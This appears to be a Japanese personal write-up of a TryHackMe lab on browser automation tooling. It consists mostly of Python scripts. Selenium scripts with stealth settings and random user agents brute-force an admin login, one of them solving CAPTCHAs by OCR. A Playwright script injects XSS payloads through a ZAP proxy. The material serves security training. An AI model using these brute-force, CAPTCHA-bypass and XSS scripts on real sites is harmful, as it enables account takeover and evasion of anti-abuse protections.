# ブラウザ自動ツール

https://tryhackme.com/room/customtoolingviabrowserautomation

## Selenium

### ログイン認証

```python
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
import logging
from fake_useragent import UserAgent

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.10.234.138/labs/lab1/'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

# Credentials to brute-force
username = "admin"
passwords = ["123456", "admin", "letmein", "pass123", "password"]  # Replace with file if needed

# Loop over passwords
for password in passwords:
    chrome.get(login_url)
    time.sleep(0.5)

    # Grab CSRF token
    #csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

    # Fill out login form
    chrome.find_element(By.NAME, "username").send_keys(username)
    chrome.find_element(By.NAME, "password").send_keys(password)
    #chrome.find_element(By.NAME, "csrf_token").send_keys(csrf)
    chrome.find_element(By.TAG_NAME, "form").submit()

    time.sleep(0.5)

    # Check if login successful (simple way)
    if dashboard_url in chrome.current_url:
        print(f"[+] Login successful with password: {password}")
        flag_element = chrome.find_element(By.TAG_NAME, "p")
        flag = flag_element.text.strip()
        print(f"[+] {flag}")
        break
    else:
        print(f"[-] Failed login with: {password}")

chrome.quit()
```

### CAPTCHA 回避

```python
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.10.234.138/labs/lab2'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

username = "admin"
passwords = ["123456", "admin", "letmein", "password123", "password"]

for password in passwords:
    while True:
        chrome.get(login_url)
        time.sleep(1)

        # Grab CSRF token
        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

        # Get CAPTCHA image rendered in-browser
        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img_element.screenshot_as_png

        # Preprocess image for OCR
        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        # OCR the CAPTCHA
        captcha_text = pytesseract.image_to_string(
            image,
            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace(" ", "").replace("\n", "").upper()

        # Save the image for review
        image.save(f"captchas/captcha_{password}_{captcha_text}.png")

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
            continue

        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")

        # Fill out and submit the form
        chrome.find_element(By.NAME, "username").send_keys(username)
        chrome.find_element(By.NAME, "password").send_keys(password)
        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
        chrome.find_element(By.TAG_NAME, "form").submit()

        time.sleep(1)

        print("=== HTML Output After Submit ===")
        print(chrome.page_source)
        print("================================")

        if dashboard_url in chrome.current_url:
            print(f"[+] Login successful with password: {password}")
            try:
                flag = chrome.find_element(By.TAG_NAME, "p").text
                print(f"[+] {flag}")
            except:
                print("[!] Logged in, but no flag found.")
            chrome.quit()
            exit()
        else:
            print(f"[-] Failed login with: {password}")
            break  # try next password

chrome.quit()
```

## Playwright

```sh
pip install playwright
playwright install
```

1. ZAP で、Tools > Options > Network > Local Proxy が localhost, 8080 に設定されているとする。
2. Tools > Options > API から API キーを取得する。

```python
from playwright.sync_api import sync_playwright, Playwright
from zapv2 import ZAPv2, reports
import time
import os
import sys

class SilentOutput:
    def write(self, msg): pass
    def flush(self): pass

sys.stdout = SilentOutput()

# Config
ZAP_KEY = "kcsbj07b6u7hhii6h3b772ia90"
PROXY = "http://localhost:8080"
TARGET_URL = "http://10.10.215.190:5000/"
xss_tests = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
]

def execute_automation(playwright: Playwright):
    zap = ZAPv2(apikey=ZAP_KEY, proxies={'http': PROXY})
    zap.core.new_session(name="silent_passive", overwrite=True)

    browser = playwright.firefox.launch(headless=True)
    context = browser.new_context(
        ignore_https_errors=True,
        proxy={"server": PROXY}
    )
    page = context.new_page()

    sys.stdout = sys.__stdout__

    for payload in xss_tests:
        print(f"Injecting Payload: {payload}")
        page.once("dialog", lambda dialog: dialog.dismiss())
        page.goto(f"{TARGET_URL}?name={payload}")
        time.sleep(1)

    sys.stdout = SilentOutput()
    while int(zap.pscan.records_to_scan) > 0:
        time.sleep(1)

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    zap_reporter = reports(zap)
    zap_reporter.generate(
        title="Silent Passive XSS Scan",
        template="traditional-pdf",
        description="Clean scan",
        reportfilename="zap_passive_silent_report.pdf",
        reportdir=desktop_path,
        display=False,
    )

    browser.close()

with sync_playwright() as pw:
    execute_automation(pw)
```
